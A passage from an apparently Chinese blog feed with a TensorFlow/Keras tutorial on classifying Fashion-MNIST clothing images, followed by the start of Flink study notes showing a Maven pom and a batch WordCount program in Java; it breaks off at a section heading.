    <content type="html"><![CDATA[<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>实现<a href="https://www.tensorflow.org/tutorials/keras/classification?hl=zh_cn">官方案例</a>，训练一个神经网络模型，对运动鞋和衬衫等服装图像进行分类，数据集来自<a href="https://github.com/zalandoresearch/fashion-mnist">Fashion-MNIST 样本</a></p><p>本文环境为Python3 x64，windows系统</p><span id="more"></span><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><h2 id="一、使用前准备"><a href="#一、使用前准备" class="headerlink" title="一、使用前准备"></a>一、使用前准备</h2><h3 id="1-安装依赖"><a href="#1-安装依赖" class="headerlink" title="1. 安装依赖"></a>1. 安装依赖</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">pip install numpy==1.18.5<br>pip install tensorflow==2.3.0<br></code></pre></td></tr></table></figure><p>会自动安装相关依赖</p><blockquote><p>Successfully installed tensorboard-2.8.0 tensorboard-data-server-0.6.1 tensorflow-2.3.0 tensorflow-estimator-2.3.0</p></blockquote><h3 id="2-在项目中引用"><a href="#2-在项目中引用" class="headerlink" title="2. 在项目中引用"></a>2. 在项目中引用</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># TensorFlow and tf.keras</span><br><span class="hljs-keyword">import</span> tensorflow <span class="hljs-keyword">as</span> tf<br><span class="hljs-keyword">from</span> tensorflow <span class="hljs-keyword">import</span> keras<br><br><span class="hljs-comment"># Helper libraries</span><br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br></code></pre></td></tr></table></figure><p>如果需要在matplotlib显示中文，可以添加如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 解决中文乱码问题需要用到的</span><br><span class="hljs-keyword">from</span> matplotlib.font_manager <span class="hljs-keyword">import</span> FontProperties<br>font_set = FontProperties(fname=<span class="hljs-string">r&quot;C:\windows\fonts\simsun.ttc&quot;</span>, size=<span class="hljs-number">12</span>)<br></code></pre></td></tr></table></figure><p>之后再需要显示中文的地方加上<code>fontproperties=font_set</code>参数</p><h2 id="二、使用"><a href="#二、使用" class="headerlink" title="二、使用"></a>二、使用</h2><h3 id="1-导入-Fashion-MNIST-数据集"><a href="#1-导入-Fashion-MNIST-数据集" class="headerlink" title="1. 导入 Fashion MNIST 数据集"></a>1. 导入 Fashion MNIST 数据集</h3><ul><li> 直接从 TensorFlow 中导入和加载 Fashion MNIST 数据</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">fashion_mnist = keras.datasets.fashion_mnist<br>(train_images, train_labels), (test_images, test_labels) = fashion_mnist.load_data()<br></code></pre></td></tr></table></figure><ul><li>定义类名，方便后边使用</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">class_names = [<span class="hljs-string">&#x27;T恤/上衣&#x27;</span>, <span class="hljs-string">&#x27;裤子&#x27;</span>, <span class="hljs-string">&#x27;套头衫&#x27;</span>, <span class="hljs-string">&#x27;连衣裙&#x27;</span>, <span class="hljs-string">&#x27;外套&#x27;</span>,<br>               <span class="hljs-string">&#x27;凉鞋&#x27;</span>, <span class="hljs-string">&#x27;衬衫&#x27;</span>, <span class="hljs-string">&#x27;运动鞋&#x27;</span>, <span class="hljs-string">&#x27;包&#x27;</span>, <span class="hljs-string">&#x27;短靴&#x27;</span>]<br></code></pre></td></tr></table></figure><h3 id="2-浏览数据"><a href="#2-浏览数据" class="headerlink" title="2. 浏览数据"></a>2. 浏览数据</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(train_images.shape)<br></code></pre></td></tr></table></figure><blockquote><p>(60000, 28, 28)</p></blockquote><p>可知train_images中有60000个28x28像素的图片</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(train_labels))<br><span class="hljs-built_in">print</span>(train_labels)<br></code></pre></td></tr></table></figure><blockquote><p>60000</p><p>[9 0 0 … 3 0 5]</p></blockquote><p>可知train_labels是一个数组，由60000个0-9之间的数字组成</p><p>同理可知test_images中有10000个28x28像素的图片，test_labels是一个数组，由10000个0-9之间的数字组成</p><h3 id="3-预处理数据"><a href="#3-预处理数据" class="headerlink" title="3. 预处理数据"></a>3. 预处理数据</h3><p>在训练网络之前，必须对数据进行预处理。如果您检查训练集中的第一个图像，您会看到像素值处于 0 到 255 之间</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">plt.figure()<br>plt.imshow(train_images[<span class="hljs-number">0</span>])<br>plt.colorbar()<br>plt.grid(<span class="hljs-literal">False</span>)<br>plt.show()<br></code></pre></td></tr></table></figure><img src="/2022/02/newpost-33/image-20220209100457541.png" class="" title="image-20220209100457541"><p>将其除以 255，可使值范围在0-1之间</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">train_images = train_images / <span class="hljs-number">255.0</span><br>test_images = test_images / <span class="hljs-number">255.0</span><br></code></pre></td></tr></table></figure><p>可通过以下方式验证</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">plt.figure(figsize=(<span class="hljs-number">10</span>,<span class="hljs-number">10</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">25</span>):<br>    plt.subplot(<span class="hljs-number">5</span>,<span class="hljs-number">5</span>,i+<span class="hljs-number">1</span>)<br>    plt.xticks([])<br>    plt.yticks([])<br>    plt.grid(<span class="hljs-literal">False</span>)<br>    plt.imshow(train_images[i], cmap=plt.cm.binary)<br>    plt.xlabel(class_names[train_labels[i]], fontproperties=font_set)<br>plt.show()<br></code></pre></td></tr></table></figure><img src="/2022/02/newpost-33/image-20220209101053731.png" class="" title="image-20220209101053731"><h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># TensorFlow and tf.keras</span><br><span class="hljs-keyword">import</span> tensorflow <span class="hljs-keyword">as</span> tf<br><span class="hljs-keyword">from</span> tensorflow <span class="hljs-keyword">import</span> keras<br><br><span class="hljs-keyword">from</span> matplotlib.font_manager <span class="hljs-keyword">import</span> FontProperties<br>font_set = FontProperties(fname=<span class="hljs-string">r&quot;C:\windows\fonts\simsun.ttc&quot;</span>, size=<span class="hljs-number">12</span>)<br><br><span class="hljs-comment"># Helper libraries</span><br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><br><span class="hljs-comment"># 直接从 TensorFlow 中导入和加载 Fashion MNIST 数据</span><br>fashion_mnist = keras.datasets.fashion_mnist<br>(train_images, train_labels), (test_images, test_labels) = fashion_mnist.load_data()<br><span class="hljs-comment"># 定义类名，方便后边使用</span><br>class_names = [<span class="hljs-string">&#x27;T恤/上衣&#x27;</span>, <span class="hljs-string">&#x27;裤子&#x27;</span>, <span class="hljs-string">&#x27;套头衫&#x27;</span>, <span class="hljs-string">&#x27;连衣裙&#x27;</span>, <span class="hljs-string">&#x27;外套&#x27;</span>,<br>               <span class="hljs-string">&#x27;凉鞋&#x27;</span>, <span class="hljs-string">&#x27;衬衫&#x27;</span>, <span class="hljs-string">&#x27;运动鞋&#x27;</span>, <span class="hljs-string">&#x27;包&#x27;</span>, <span class="hljs-string">&#x27;短靴&#x27;</span>]<br><br><span class="hljs-comment"># print(train_images.shape)</span><br><span class="hljs-comment"># print(len(train_labels))</span><br><span class="hljs-comment"># print(train_labels)</span><br><br><span class="hljs-comment"># plt.figure()</span><br><span class="hljs-comment"># plt.imshow(train_images[0])</span><br><span class="hljs-comment"># plt.colorbar()</span><br><span class="hljs-comment"># plt.grid(False)</span><br><span class="hljs-comment"># plt.show()</span><br><br>train_images = train_images / <span class="hljs-number">255.0</span><br>test_images = test_images / <span class="hljs-number">255.0</span><br><br><span class="hljs-comment"># plt.figure(figsize=(10,10))</span><br><span class="hljs-comment"># for i in range(25):</span><br><span class="hljs-comment">#     plt.subplot(5,5,i+1)</span><br><span class="hljs-comment">#     plt.xticks([])</span><br><span class="hljs-comment">#     plt.yticks([])</span><br><span class="hljs-comment">#     plt.grid(False)</span><br><span class="hljs-comment">#     plt.imshow(train_images[i], cmap=plt.cm.binary)</span><br><span class="hljs-comment">#     plt.xlabel(class_names[train_labels[i]], fontproperties=font_set)</span><br><span class="hljs-comment"># plt.show()</span><br><br><span class="hljs-comment"># 模型配置</span><br>model = keras.Sequential([<br>    keras.layers.Flatten(input_shape=(<span class="hljs-number">28</span>, <span class="hljs-number">28</span>)),<br>    keras.layers.Dense(<span class="hljs-number">128</span>, activation=<span class="hljs-string">&#x27;relu&#x27;</span>),<br>    keras.layers.Dense(<span class="hljs-number">10</span>)<br>])<br><br>model.<span class="hljs-built_in">compile</span>(optimizer=<span class="hljs-string">&#x27;adam&#x27;</span>,<br>              loss=tf.keras.losses.SparseCategoricalCrossentropy(from_logits=<span class="hljs-literal">True</span>),<br>              metrics=[<span class="hljs-string">&#x27;accuracy&#x27;</span>])<br><br><span class="hljs-comment"># 训练</span><br>model.fit(train_images, train_labels, epochs=<span class="hljs-number">10</span>)<br><br><span class="hljs-comment"># test_loss, test_acc = model.evaluate(test_images,  test_labels, verbose=2)</span><br><br><span class="hljs-comment"># print(&#x27;\nTest accuracy:&#x27;, test_acc)</span><br><br>probability_model = tf.keras.Sequential([model, <br>                                         tf.keras.layers.Softmax()])<br><br>predictions = probability_model.predict(test_images)<br><br><span class="hljs-comment"># print(predictions[0])</span><br><br><span class="hljs-comment"># 图片与标签</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">plot_image</span>(<span class="hljs-params">i, predictions_array, true_label, img</span>):<br>  predictions_array, true_label, img = predictions_array, true_label[i], img[i]<br>  plt.grid(<span class="hljs-literal">False</span>)<br>  plt.xticks([])<br>  plt.yticks([])<br><br>  plt.imshow(img, cmap=plt.cm.binary)<br><br>  predicted_label = np.argmax(predictions_array)<br>  <span class="hljs-keyword">if</span> predicted_label == true_label:<br>    color = <span class="hljs-string">&#x27;blue&#x27;</span><br>  <span class="hljs-keyword">else</span>:<br>    color = <span class="hljs-string">&#x27;red&#x27;</span><br><br>  plt.xlabel(<span class="hljs-string">&quot;&#123;&#125; &#123;:2.0f&#125;% (&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(class_names[predicted_label],<br>                                <span class="hljs-number">100</span>*np.<span class="hljs-built_in">max</span>(predictions_array),<br>                                class_names[true_label]),<br>                                color=color,<br>                                fontproperties=font_set)<br><br><span class="hljs-comment"># 表</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">plot_value_array</span>(<span class="hljs-params">i, predictions_array, true_label</span>):<br>  predictions_array, true_label = predictions_array, true_label[i]<br>  plt.grid(<span class="hljs-literal">False</span>)<br>  plt.xticks(<span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>))<br>  plt.yticks([])<br>  thisplot = plt.bar(<span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>), predictions_array, color=<span class="hljs-string">&quot;#777777&quot;</span>)<br>  plt.ylim([<span class="hljs-number">0</span>, <span class="hljs-number">1</span>])<br>  predicted_label = np.argmax(predictions_array)<br><br>  thisplot[predicted_label].set_color(<span class="hljs-string">&#x27;red&#x27;</span>)<br>  thisplot[true_label].set_color(<span class="hljs-string">&#x27;blue&#x27;</span>)<br><br><br><span class="hljs-comment"># Plot the first X test images, their predicted labels, and the true labels.</span><br><span class="hljs-comment"># Color correct predictions in blue and incorrect predictions in red.</span><br>num_rows = <span class="hljs-number">5</span><br>num_cols = <span class="hljs-number">3</span><br>num_images = num_rows*num_cols<br>plt.figure(figsize=(<span class="hljs-number">2</span>*<span class="hljs-number">2</span>*num_cols, <span class="hljs-number">2</span>*num_rows))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_images):<br>  plt.subplot(num_rows, <span class="hljs-number">2</span>*num_cols, <span class="hljs-number">2</span>*i+<span class="hljs-number">1</span>)<br>  plot_image(i, predictions[i], test_labels, test_images)<br>  plt.subplot(num_rows, <span class="hljs-number">2</span>*num_cols, <span class="hljs-number">2</span>*i+<span class="hljs-number">2</span>)<br>  plot_value_array(i, predictions[i], test_labels)<br>plt.tight_layout()<br>plt.show()<br></code></pre></td></tr></table></figure><p>训练结果</p><img src="/2022/02/newpost-33/image-20220209101637672.png" class="" title="image-20220209101637672"><p>预测结果</p><img src="/2022/02/newpost-33/image-20220209101620384.png" class="" title="image-20220209101620384">]]></content>
    
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>机器学习</tag>
      
      <tag>TensorFlow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Flink学习笔记</title>
    <link href="/2022/01/newpost-32/"/>
    <url>/2022/01/newpost-32/</url>
    
    <content type="html"><![CDATA[<p>本文基于B站视频教程<a href="https://www.bilibili.com/video/BV1qy4y1q728">尚硅谷Java版Flink（武老师清华硕士，原IBM-CDL负责人）</a>，本文软件版本，行文顺序等可能与视频略有不同</p><span id="more"></span><h1 id="一、概念"><a href="#一、概念" class="headerlink" title="一、概念"></a>一、概念</h1><h2 id="1-是什么"><a href="#1-是什么" class="headerlink" title="1. 是什么"></a>1. 是什么</h2><p><em>Apache Flink</em>是一个框架和分布式处理引擎，用于对<em>无界和有界</em>数据流进行状态计算。Flink 被设计为在<em>所有常见的集群环境中运行</em>，<em>以内存中的速度</em>和<em>任何规模</em>执行计算</p><h2 id="2-目标"><a href="#2-目标" class="headerlink" title="2. 目标"></a>2. 目标</h2><ul><li>低延时</li><li>高吞吐</li><li>结果的准确性和良好的容错性</li></ul><h1 id="二、使用"><a href="#二、使用" class="headerlink" title="二、使用"></a>二、使用</h1><h2 id="1-使用前准备"><a href="#1-使用前准备" class="headerlink" title="1. 使用前准备"></a>1. 使用前准备</h2><p>pom依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.ifnxs.bigdata<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>FlinkTutorial<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">flink.version</span>&gt;</span>1.12.1<span class="hljs-tag">&lt;/<span class="hljs-name">flink.version</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">scala.binary.version</span>&gt;</span>2.12<span class="hljs-tag">&lt;/<span class="hljs-name">scala.binary.version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.flink<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>flink-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.flink<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>flink-streaming-scala_$&#123;scala.binary.version&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.flink<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>flink-clients_$&#123;scala.binary.version&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p><em>flink-streaming-scala_2.12 =&gt; org.apache.flink:flink-runtime_2.12:1.12.1 =&gt; com.typesafe.akka:akka-actor_2.12:2.5.21，akka就是用scala实现的。即使这里我们用java语言，还是用到了scala实现的包</em></p></blockquote><p>hello.txt内容</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">hello</span> world<br><span class="hljs-symbol">hello</span> spark<br><span class="hljs-symbol">hello</span> flink<br><span class="hljs-symbol">how</span> are you<br><span class="hljs-symbol">fine</span> thank you<br><span class="hljs-keyword">and</span> you<br></code></pre></td></tr></table></figure><h2 id="2-批处理实现WordCount"><a href="#2-批处理实现WordCount" class="headerlink" title="2. 批处理实现WordCount"></a>2. 批处理实现WordCount</h2><p>实现代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ifnxs.bigdata.wc;<br><br><span class="hljs-keyword">import</span> org.apache.flink.api.common.functions.FlatMapFunction;<br><span class="hljs-keyword">import</span> org.apache.flink.api.java.DataSet;<br><span class="hljs-keyword">import</span> org.apache.flink.api.java.ExecutionEnvironment;<br><span class="hljs-keyword">import</span> org.apache.flink.api.java.tuple.Tuple2;<br><span class="hljs-keyword">import</span> org.apache.flink.util.Collector;<br><br><span class="hljs-comment">// 批处理</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WordCount</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 创建执行环境</span><br>        <span class="hljs-type">ExecutionEnvironment</span> <span class="hljs-variable">env</span> <span class="hljs-operator">=</span> ExecutionEnvironment.getExecutionEnvironment();<br><br>        <span class="hljs-comment">// 从文件中读取数据</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">inputPath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;D:\\learn\\bigdata\\FlinkTutorial\\src\\main\\resources\\hello.txt&quot;</span>;<br>        DataSet&lt;String&gt; inputDataSet = env.readTextFile(inputPath);<br><br>        <span class="hljs-comment">// 对数据集进行处理，按空格分词展开，转换成(word, 1)二元组进行统计</span><br>        DataSet&lt;Tuple2&lt;String, Integer&gt;&gt; resultSet = inputDataSet.flatMap(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyFlatMapper</span>())<br>                .groupBy(<span class="hljs-number">0</span>) <span class="hljs-comment">// 按照第一个位置的word分组</span><br>                .sum(<span class="hljs-number">1</span>); <span class="hljs-comment">// 按照第二个位置上的数据求和</span><br>        resultSet.print();<br>    &#125;<br><br>    <span class="hljs-comment">// 自定义类，实现FlatMapFunction接口</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyFlatMapper</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">FlatMapFunction</span>&lt;String, Tuple2&lt;String, Integer&gt;&gt; &#123;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">flatMap</span><span class="hljs-params">(String value, Collector&lt;Tuple2&lt;String, Integer&gt;&gt; out)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>            <span class="hljs-comment">// 按空格分词</span><br>            String[] words = value.split(<span class="hljs-string">&quot; &quot;</span>);<br>            <span class="hljs-comment">// 遍历所有word，包成二元组输出</span><br>            <span class="hljs-keyword">for</span> (String word : words) &#123;<br>                out.collect(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Tuple2</span>&lt;&gt;(word, <span class="hljs-number">1</span>));<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs clojure">(<span class="hljs-name">flink</span><span class="hljs-punctuation">,</span><span class="hljs-number">1</span>)<br>(<span class="hljs-name">world</span><span class="hljs-punctuation">,</span><span class="hljs-number">1</span>)<br>(<span class="hljs-name">hello</span><span class="hljs-punctuation">,</span><span class="hljs-number">3</span>)<br>(<span class="hljs-name"><span class="hljs-built_in">and</span></span><span class="hljs-punctuation">,</span><span class="hljs-number">1</span>)<br>(<span class="hljs-name">fine</span><span class="hljs-punctuation">,</span><span class="hljs-number">1</span>)<br>(<span class="hljs-name">how</span><span class="hljs-punctuation">,</span><span class="hljs-number">1</span>)<br>(<span class="hljs-name">spark</span><span class="hljs-punctuation">,</span><span class="hljs-number">1</span>)<br>(<span class="hljs-name">you</span><span class="hljs-punctuation">,</span><span class="hljs-number">3</span>)<br>(<span class="hljs-name">are</span><span class="hljs-punctuation">,</span><span class="hljs-number">1</span>)<br>(<span class="hljs-name">thank</span><span class="hljs-punctuation">,</span><span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h2 id="3-流处理实现WordCount"><a href="#3-流处理实现WordCount" 